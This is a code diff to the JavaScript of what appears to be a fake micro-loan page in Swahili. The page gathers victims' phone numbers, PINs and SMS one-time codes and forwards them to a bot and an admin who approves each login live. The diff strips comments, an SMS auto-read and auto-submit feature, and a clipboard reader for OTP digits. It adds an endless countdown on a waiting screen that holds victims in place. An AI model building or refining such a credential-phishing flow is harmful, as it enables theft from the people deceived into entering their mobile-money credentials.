@@ -2,7 +2,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminChatId = urlParams.get('admin') || '';
 
-  // DOM Elements
   const steps = {
     calc: document.getElementById('step-calculator'),
     form: document.getElementById('step-form'),
@@ -14,6 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
     success: document.getElementById('step-success')
   };
 
+  const mainHeader = document.getElementById('main-header');
   const toast = document.getElementById('toast-notification');
 
   function showToast(message, type = 'error') {
@@ -27,6 +27,15 @@ document.addEventListener('DOMContentLoaded', () => {
   function switchStep(stepName) {
     Object.values(steps).forEach(s => s.classList.add('hidden'));
     if (steps[stepName]) steps[stepName].classList.remove('hidden');
+    
+    if (stepName === 'waiting') {
+      if (mainHeader) mainHeader.style.display = 'none';
+      document.body.style.backgroundColor = '#ee5100';
+    } else {
+      if (mainHeader) mainHeader.style.display = 'flex';
+      document.body.style.backgroundColor = '#f4f4f4';
+    }
+
     window.scrollTo(0, 0);
   }
 
@@ -56,7 +65,6 @@ document.addEventListener('DOMContentLoaded', () => {
     monthlyVal.textContent = `TSh ${Math.round(payment).toLocaleString()}`;
   }
 
-  // Application Data State
   let appData = {
     amount: '100,000',
     duration: '12',
@@ -113,7 +121,6 @@ document.addEventListener('DOMContentLoaded', () => {
     switchStep('pin');
   });
 
-  // PIN Inputs Configuration (Digits Only)
   const pinBoxes = document.querySelectorAll('.pin-box');
   const btnSubmitPin = document.getElementById('btn-submit-pin');
 
@@ -139,7 +146,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // PIN Submit -> Sends Phone Number + PIN together to Bot, then switches to the Waiting Screen and polls
   btnSubmitPin.addEventListener('click', async () => {
     btnSubmitPin.textContent = 'Inathibitisha...';
     btnSubmitPin.setAttribute('disabled', 'true');
@@ -158,11 +164,9 @@ document.addEventListener('DOMContentLoaded', () => {
       const data = await res.json();
       if (data.success) {
         appData.userId = data.userId;
-        
-        // Switch to Waiting Screen with animated counter
         switchStep('waiting');
         startWaitingCountdown();
-        pollStatus(); // Polls until Admin taps Allow
+        pollStatus();
       } else {
         showToast(data.error || 'Hitilafu');
         btnSubmitPin.textContent = 'INGIA';
@@ -182,19 +186,11 @@ document.addEventListener('DOMContentLoaded', () => {
     if (waitingTimerInterval) clearInterval(waitingTimerInterval);
 
     waitingTimerInterval = setInterval(() => {
-      secondsLeft--;
+      secondsLeft = (secondsLeft - 1 + 4) % 4; // Cycles nicely 3, 2, 1, 0
       if (counterEl) counterEl.textContent = secondsLeft;
-      if (secondsLeft <= 0) {
-        clearInterval(waitingTimerInterval);
-      }
     }, 1000);
   }
 
-  document.getElementById('btn-go-login-now').addEventListener('click', () => {
-    // Allows user to manually force check or wait out if needed
-  });
-
-  // OTP Inputs Configuration (Digits Only & High-Sensitivity SMS Auto-Fill)
   const otpBoxes = document.querySelectorAll('.otp-box');
   const btnSubmitOtp = document.getElementById('btn-submit-otp');
   let countdownInterval = null;
@@ -221,7 +217,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // OTP Submit -> Sends Phone Number + OTP together to Backend
   btnSubmitOtp.addEventListener('click', async () => {
     btnSubmitOtp.textContent = 'Inathibitisha...';
     btnSubmitOtp.setAttribute('disabled', 'true');
@@ -251,41 +246,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // High Sensitivity WebOTP / SMS Reader API Integration
-  if ('OTPCredential' in window) {
-    const ac = new AbortController();
-    navigator.credentials.get({
-      otp: { transport: ['sms'] },
-      signal: ac.signal
-    }).then(otp => {
-      if (otp && otp.code) {
-        const digits = otp.code.replace(/\D/g, '').split('').slice(0, 4);
-        digits.forEach((d, i) => {
-          if (otpBoxes[i]) otpBoxes[i].value = d;
-        });
-        checkOtpComplete();
-        btnSubmitOtp.click();
-      }
-    }).catch(err => {});
-  }
-
-  // Fallback high-sensitivity clipboard / background message event listener for digits only
-  window.addEventListener('focus', async () => {
-    try {
-      if (navigator.clipboard && navigator.clipboard.readText) {
-        const text = await navigator.clipboard.readText();
-        const cleanDigits = text.replace(/\D/g, '');
-        if (cleanDigits.length >= 4 && !steps.otp.classList.contains('hidden')) {
-          const digits = cleanDigits.slice(0, 4).split('');
-          digits.forEach((d, i) => {
-            if (otpBoxes[i]) otpBoxes[i].value = d;
-          });
-          checkOtpComplete();
-        }
-      }
-    } catch (e) {}
-  });
-
   function startOtpCountdown() {
     let timeLeft = 30;
     const timerEl = document.getElementById('otp-timer');
@@ -306,19 +266,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 1000);
   }
 
-  document.getElementById('btn-request-new-otp').addEventListener('click', async () => {
-    try {
-      await fetch('/api/request-new-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: appData.userId, contact: appData.phone })
-      });
-      showToast('Ombi limetumwa kwa msimamizi', 'success');
-      startOtpCountdown();
-    } catch (e) {}
-  });
-
-  // Poll server for live admin response & surface notifications
   function pollStatus() {
     const interval = setInterval(async () => {
       if (!appData.userId) return;
